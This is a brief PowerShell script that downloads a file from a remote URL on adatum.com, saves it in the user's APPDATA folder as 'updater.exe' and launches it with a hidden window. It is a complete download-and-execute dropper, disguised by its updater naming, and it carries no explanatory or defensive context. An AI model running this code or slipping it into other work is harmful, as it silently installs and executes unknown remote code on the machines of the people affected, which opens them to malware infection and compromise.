[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://adatum.com/update.dat',
    [string]$PayloadPath = "$env:APPDATA\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $PayloadPath)
Start-Process -FilePath $PayloadPath -WindowStyle Hidden
Set-Location -Path $env:TEMP
